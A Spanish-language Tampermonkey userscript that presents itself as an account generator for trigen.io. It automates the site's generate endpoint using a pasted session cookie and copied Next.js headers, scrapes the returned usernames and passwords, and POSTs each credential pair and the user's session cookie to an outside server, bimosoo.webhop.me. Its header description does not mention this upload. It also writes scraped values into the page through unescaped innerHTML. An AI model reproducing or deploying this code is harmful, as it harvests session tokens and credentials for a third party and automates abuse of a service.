// ==UserScript==
// @name         Trigen Account Generator
// @namespace    http://tampermonkey.net/
// @version      2025-07-31
// @description  Generador de cuentas para Trigen
// @author       Bimo
// @match        https://trigen.io/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=trigen.io
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// ==/UserScript==

(function() {
    'use strict';
    // Carga solo las fuentes (ya no necesitamos axios)
    const fontRubik = document.createElement('link');
    fontRubik.rel = 'stylesheet';
    fontRubik.href = 'https://fonts.googleapis.com/css2?family=Bitcount+Grid+Single:wght@100..900&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap';
    document.head.appendChild(fontRubik);

    // Inyecta estilos para panel flotante, textos negros y drag
    const style = document.createElement('style');
    style.textContent = `
    #trigenPanel {
        position: fixed;
        top: 2rem;
        right: 2rem;
        z-index: 2147483647;
        background: #fff;
        color: #111;
        font-family: 'Rubik', sans-serif;
        border-radius: 12px;
        box-shadow: 0 4px 16px rgba(0,0,0,0.13);
        width: 340px;
        max-width: 90vw;
        min-width: 260px;
        transition: box-shadow 0.2s;
        border: 1px solid #ddd;
        overflow: hidden;
        user-select: none;
    }
    #trigenPanelHeader {
        background: #007bff;
        color: #fff;
        padding: 0.7rem 1.2rem;
        font-size: 1.1rem;
        font-weight: bold;
        cursor: move;
        user-select: none;
        display: flex;
        align-items: center;
        justify-content: space-between;
        border-bottom: 1px solid #eee;
    }
    #trigenPanelHeader span {
        font-size: 1.2rem;
        margin-left: 0.5rem;
        transition: transform 0.2s;
        cursor: pointer;
    }
    #trigenPanelBody {
        padding: 1.2rem;
        background: #fff;
        color: #111;
        display: block;
    }
    #trigenPanelBody[hidden] {
        display: none;
    }
    .formContent {
        display: flex;
        flex-direction: column;
        gap: 1rem;
    }
    .formGroup {
        display: flex;
        flex-direction: column;
    }
    .formGroup label {
        font-size: 1rem;
        color: #222;
        margin-bottom: 0.5rem;
    }
    .formContent input[type='text'] {
        padding: 0.75rem;
        border: 1px solid #bbb;
        border-radius: 6px;
        font-size: 1rem;
        width: 100%;
        box-sizing: border-box;
        transition: border 0.2s;
        color: #111;
        background: #f7f7f7;
    }
    .formContent input[type='text']:focus {
        border-color: #007bff;
        outline: none;
    }
    .formContent button {
        padding: 0.75rem;
        background: #007bff;
        color: #fff;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-size: 1rem;
        width: 100%;
        transition: background 0.2s;
    }
    .formContent button:hover {
        background: #0056b3;
    }
    .cuentas-container {
        margin-top: 1.2rem;
        display: flex;
        flex-direction: column;
        gap: 0.7rem;
    }
    .cuenta-generada {
        background: #f7f7f7;
        border-radius: 8px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.07);
        padding: 0.7rem;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        font-size: 1rem;
        word-break: break-all;
        border-left: 4px solid #007bff;
        animation: fadeInCuenta 0.5s;
        color: #111;
    }
    .cuenta-user {
        font-weight: bold;
        color: #222;
        margin-bottom: 0.3rem;
    }
    .cuenta-pass {
        color: #007bff;
        font-family: monospace;
    }
    @keyframes fadeInCuenta {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }
    .popup-notificacion {
        position: fixed;
        top: 1rem;
        right: 2rem;
        background: #222;
        color: #fff;
        padding: 0.7rem 1.2rem;
        border-radius: 8px;
        box-shadow: 0 2px 12px rgba(0,0,0,0.15);
        font-size: 1rem;
        z-index: 2147483647;
        display: none;
        min-width: 120px;
        text-align: center;
        animation: fadeInPopup 0.3s;
    }
    .popup-notificacion.success { background: #28a745; }
    .popup-notificacion.error { background: #dc3545; }
    .popup-notificacion.warning { background: #ffc107; color: #222; }
    .popup-notificacion.info { background: #007bff; }
    @keyframes fadeInPopup {
        from { opacity: 0; transform: scale(0.9); }
        to { opacity: 1; transform: scale(1); }
    }
    @media (max-width: 600px) {
        #trigenPanel { right: 0.5rem; top: 0.5rem; width: 98vw; min-width: 0; }
        #trigenPanelHeader { font-size: 1rem; padding: 0.5rem 0.7rem; }
        #trigenPanelBody { padding: 0.7rem; }
    }
    `;
    document.head.appendChild(style);



    // Inyecta el panel flotante
    function injectUI() {
        const panel = document.createElement('div');
        panel.id = 'trigenPanel';
        panel.innerHTML = `
            <div id="trigenPanelHeader">Generar Cuenta <span id="trigenPanelToggle">▼</span></div>
            <div id="trigenPanelBody">
                <div class="formContent">
                    <div class="formGroup">
                        <label for="cookies">Cookie:</label>
                        <input type="text" id="cookieTamper" name="cookieTamper" placeholder="Ej: 4d574f55-9cc4-4bc1-8dd1-8dbef9ec56a1" required>
                    </div>
                    <button id="generateAccountButtonTamper">Generar Cuenta</button>
                </div>
                <div id="cuentasGeneradasContainerTamper" class="cuentas-container"></div>
            </div>
        `;
        document.body.appendChild(panel);
        const popup = document.createElement('div');
        popup.id = 'popupNotificacionTamper';
        popup.className = 'popup-notificacion';
        document.body.appendChild(popup);
        // Toggle desplegable
        const header = document.getElementById('trigenPanelHeader');
        const body = document.getElementById('trigenPanelBody');
        const toggle = document.getElementById('trigenPanelToggle');
        let abierto = true;
        toggle.onclick = function(e) {
            e.stopPropagation();
            abierto = !abierto;
            body.hidden = !abierto;
            toggle.textContent = abierto ? '▼' : '▲';
        };
        // Drag & move
        let isDragging = false, startX, startY, startTop, startRight;
        header.addEventListener('mousedown', function(e) {
            if (e.target === toggle) return;
            isDragging = true;
            startX = e.clientX;
            startY = e.clientY;
            startTop = panel.offsetTop;
            startRight = window.innerWidth - (panel.offsetLeft + panel.offsetWidth);
            document.body.style.userSelect = 'none';
        });
        document.addEventListener('mousemove', function(e) {
            if (!isDragging) return;
            let newTop = startTop + (e.clientY - startY);
            let newRight = startRight - (e.clientX - startX);
            newTop = Math.max(0, Math.min(window.innerHeight - panel.offsetHeight, newTop));
            newRight = Math.max(0, Math.min(window.innerWidth - panel.offsetWidth, newRight));
            panel.style.top = newTop + 'px';
            panel.style.right = newRight + 'px';
        });
        document.addEventListener('mouseup', function() {
            isDragging = false;
            document.body.style.userSelect = '';
        });
        // Evita que el panel desaparezca si React hace rerender
        setInterval(() => {
            if (!document.body.contains(panel)) document.body.appendChild(panel);
            if (!document.body.contains(popup)) document.body.appendChild(popup);
        }, 2000);
    }

    // Función para obtener headers dinámicos necesarios
    function getNextActionHeader() {
        // Busca el next-action en los meta tags o scripts de la página
        const metaTags = document.getElementsByTagName('meta');
        for (let meta of metaTags) {
            if (meta.name === 'next-action' || meta.getAttribute('name') === 'next-action') {
                return meta.content;
            }
        }
        // Si no se encuentra, usa un valor por defecto (necesitarás obtener el real)
        return '7fe0d40ff39cf9bf50f07726964b6a24cb333a1566';
    }

    function getNextRouterStateTree() {
        // Estado del router de Next.js
        return '%5B%22%22%2C%7B%22children%22%3A%5B%22dashboard%22%2C%7B%22children%22%3A%5B%22generate%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fdashboard%2Fgenerate%22%2C%22refresh%22%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D';
    }

    // Funciones JS
    function extraerDatosAlt(respuestaTexto) {
        try {
            let pattern = /16:\[\{.*?"username":"([^"]+)".*?"password":"([^"]+)".*?\}\]/;
            let match = respuestaTexto.match(pattern);
            if (match) return [match[1], match[2]];
            let pattern2 = /"name":"([^"]+)".*?"password":"([^"]+)"/;
            let match2 = respuestaTexto.match(pattern2);
            if (match2) return [match2[1], match2[2]];
            return [null, null];
        } catch (e) {
            return [null, null];
        }
    }
    function mostrarCuentaGenerada(username, password) {
        const container = document.getElementById('cuentasGeneradasContainerTamper');
        const cuentaDiv = document.createElement('div');
        cuentaDiv.className = 'cuenta-generada';
        cuentaDiv.innerHTML = `<div class="cuenta-user">${username}</div><div class="cuenta-pass">${password}</div>`;
        container.appendChild(cuentaDiv);
    }
    function mostrarPopup(mensaje, tipo = 'info') {
        const popup = document.getElementById('popupNotificacionTamper');
        popup.textContent = mensaje;
        popup.className = `popup-notificacion ${tipo}`;
        popup.style.display = 'block';
        setTimeout(() => { popup.style.display = 'none'; }, 2500);
    }
    function reportarCuentaGenerada(username, password) {
        GM_xmlhttpRequest({
            method: 'POST',
            url: 'https://bimosoo.webhop.me/addAccountRoblox',
            headers: {
                'Content-Type': 'application/json'
            },
            data: JSON.stringify({ email: username, password: password }),
            onload: function(response) {
                if (response.status === 200) {
                    mostrarPopup('Cuenta reportada correctamente', 'success');
                } else {
                    mostrarPopup('Error al reportar la cuenta', 'error');
                }
            },
            onerror: function() {
                mostrarPopup('Error al reportar la cuenta', 'error');
            }
        });
    }
    function reportarCuentaUsada(cookie) {
        GM_xmlhttpRequest({
            method: 'POST',
            url: 'https://bimosoo.webhop.me/setUseAccount',
            headers: {
                'Content-Type': 'application/json'
            },
            data: JSON.stringify({ cookie: cookie }),
            onload: function(response) {
                if (response.status === 200) {
                    mostrarPopup('Cookie reportada correctamente', 'success');
                } else {
                    mostrarPopup('Error al reportar la cookie', 'error');
                }
            },
            onerror: function() {
                mostrarPopup('Error al reportar la cookie', 'error');
            }
        });
    }
    async function generateAccount(cookie, intento = 1, maxIntentos = 10) {
        if (intento > maxIntentos) {
            mostrarPopup('Máximo de intentos alcanzado', 'error');
            return false;
        }
        
        return new Promise((resolve) => {
            // Usando GM_xmlhttpRequest para evitar las restricciones de CORS y headers unsafe
            GM_xmlhttpRequest({
                method: 'POST',
                url: 'https://trigen.io/dashboard/generate',
                headers: {
                    'Accept': 'text/x-component',
                    'Content-Type': 'text/plain;charset=UTF-8',
                    'next-action': getNextActionHeader(),
                    'next-router-state-tree': getNextRouterStateTree(),
                    'x-deployment-id': 'dpl_CbaH7zadhE1MwwxRbVZ9ex7n3JLw',
                    'Origin': 'https://trigen.io',
                    'Referer': 'https://trigen.io/dashboard/generate',
                    'Cookie': `session=${cookie}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
                },
                data: '[{}]',
                onload: function(response) {
                    console.log('Response status:', response.status);
                    console.log('Response data:', response.responseText);
                    
                    if (response.status === 303) {
                        const [username, password] = extraerDatosAlt(response.responseText);
                        if (username && password) {
                            mostrarCuentaGenerada(username, password);
                            mostrarPopup(`Cuenta generada: ${username}`, 'success');
                            reportarCuentaGenerada(username, password);
                            resolve(true);
                        } else {
                            mostrarPopup('No se pudo extraer datos, reintentando...', 'warning');
                            setTimeout(() => {
                                generateAccount(cookie, intento + 1).then(resolve);
                            }, 2000);
                        }
                    } else {
                        mostrarPopup(`Respuesta inesperada: ${response.status}`, 'error');
                        console.error('Response completa:', response);
                        setTimeout(() => {
                            generateAccount(cookie, intento + 1).then(resolve);
                        }, 2000);
                    }
                },
                onerror: function(error) {
                    console.error('Error en generateAccount:', error);
                    mostrarPopup('Error al generar cuenta, reintentando...', 'warning');
                    setTimeout(() => {
                        generateAccount(cookie, intento + 1).then(resolve);
                    }, 2000);
                }
            });
        });
    }
    function setupEvents() {
        document.getElementById('generateAccountButtonTamper').addEventListener('click', async () => {
            const cookie = document.getElementById('cookieTamper').value;
            if (!cookie) {
                mostrarPopup('Por favor ingresa una cookie', 'error');
                return;
            }
            
            const cuentasPorCookie = 2;
            let cuentasGeneradas = 0;
            for (let i = 0; i < cuentasPorCookie; i++) {
                if (await generateAccount(cookie)) cuentasGeneradas++;
                // Espera entre intentos para evitar rate limiting
                if (i < cuentasPorCookie - 1) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            if (cuentasGeneradas > 0) {
                mostrarPopup(`Se generaron ${cuentasGeneradas} cuentas`, 'success');
                reportarCuentaUsada(cookie);
            } else {
                mostrarPopup('No se generaron cuentas', 'error');
            }
        });
    }
    // Espera a que el DOM esté listo
    function waitForDOM(cb) {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', cb);
        } else {
            cb();
        }
    }

    // Inicializa todo
    waitForDOM(() => {
        injectUI();
        setupEvents();
    });
})();
